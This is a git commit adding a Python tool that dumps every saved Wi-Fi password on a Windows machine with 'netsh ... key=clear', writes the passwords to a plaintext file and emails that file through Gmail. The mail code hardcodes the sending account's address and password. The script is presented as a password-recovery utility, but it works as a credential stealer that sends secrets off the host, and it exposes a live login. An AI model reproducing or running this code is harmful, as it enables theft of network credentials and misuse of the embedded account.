a1841e616d2dfc94a78ede86e6a5d84b85997797
Burak Büyükyüksel <buyukyukselburak@gmail.com>
2020-05-08 09:36:29 +0300

    Project.2 eklendi.

---
+++ Project.2.ShowWifiPasswords/main.py
@@ -0,0 +1,69 @@
+# -*- coding: utf-8 -*-
+import subprocess
+import locale
+import re, time, os
+import codecs
+from termcolor import colored
+from send_email import send_mail
+
+locale.setlocale(locale.LC_ALL, "Turkish")
+
+def hidden(_str_, size=4):
+    # Hidden password contents
+    numofstar = len(_str_) - size
+    return _str_[:size] + '*'*numofstar
+
+def replacer(_str_):
+    # It's for Turkish chars
+    REPLACE = {
+    '§':'ğ',
+    '\x9e': 'Ş',
+    }
+    for i,j in REPLACE.items():
+        _str_ = _str_.replace(i, j)
+    return _str_
+
+if __name__ == '__main__':
+    print("Checking 'config.txt' file")
+    if "config.txt" not in os.listdir('.'):
+        email = input("Your email address:")
+        with open('config.txt', 'w') as f:
+            f.write('{};'.format(email))
+    else:
+        with open('config.txt', 'r') as f:
+            email = f.read().split(';')[0]
+
+    print("System is scanning...")
+    time.sleep(2)
+
+    response = subprocess.check_output(
+        ['netsh', 'wlan', 'show', 'profiles']
+    ).decode('iso-8859-9').replace('\r', '').split('\n')
+
+    profiles = [x.split(':')[1].strip() for x in response if "All User Profile" in x]
+
+
+    Passwords = {}
+    for _,__profile__ in enumerate(profiles):
+        profile = replacer(__profile__)
+        try:
+            pass_response = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').replace('\r', '\n').split('\n')
+            password = [x.split(':')[1].strip() for x in pass_response if "Key Content" in x]
+            print(f"Profile: {profile}")
+            Passwords[profile] = password if password else ['None']
+        except :
+            print(f"Unsuccess!\n\t Profile: {profile}")
+
+    print("{}".format('#'*70))    
+    print("@Codewithperesthayal >> https://www.instagram.com/codewithperesthayal")
+    with codecs.open('passwords.txt', 'w', 'utf-8') as f:
+        f.write("{}\n".format('#'*70))
+        f.write("@Codewithperesthayal >> https://www.instagram.com/codewithperesthayal\n")
+        f.write("{}\n\n".format('#'*70))
+
+        for i, items in enumerate(Passwords.items()): 
+            i,j = items
+            f.write(">> {:<40}:{:<30}\n".format(i,j[0]))
+    send_mail(email)
+    
+
---
+++ Project.2.ShowWifiPasswords/send_email.py
@@ -0,0 +1,47 @@
+import smtplib, ssl
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import os
+
+def send_mail(receiver_email):
+    sender_email = 'codewithperesthayal@gmail.com'
+    password = 'codewithperesthayal'
+    
+    message = MIMEMultipart("alternative")
+    message["Subject"] = "Codewithperesthayal-Passwords"
+    message["From"] = sender_email
+    message["To"] = receiver_email
+    # Create the plain-text and HTML version of your message
+    html = """\
+    <html>
+      <body>
+        <p><br>
+           <i style='color:red;'>Passwords are ready!</i><br/>
+           <a href="https://www.instagram.com/codewithperesthayal"><b>@Codewithperesthayal</b></a><br/>
+           Have a great day :)
+        </p>
+      </body>
+    </html>
+    """
+    # Turn these into plain/html MIMEText objects
+    part1 = MIMEText(html, "html")
+    # Add HTML/plain-text parts to MIMEMultipart message
+    # The email client will try to render the last part first
+    # Attach File
+    file='./passwords.txt'
+    message.attach(part1)
+    attachment = MIMEBase('application', 'octet-stream')
+    attachment.set_payload(open(file, 'rb').read())
+    encoders.encode_base64(attachment)
+    attachment.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
+    message.attach(attachment)
+
+    # Create secure connection with server and send email
+    context = ssl.create_default_context()
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+        server.login(sender_email, password)
+        server.sendmail(
+            sender_email, receiver_email, message.as_string()
+        )
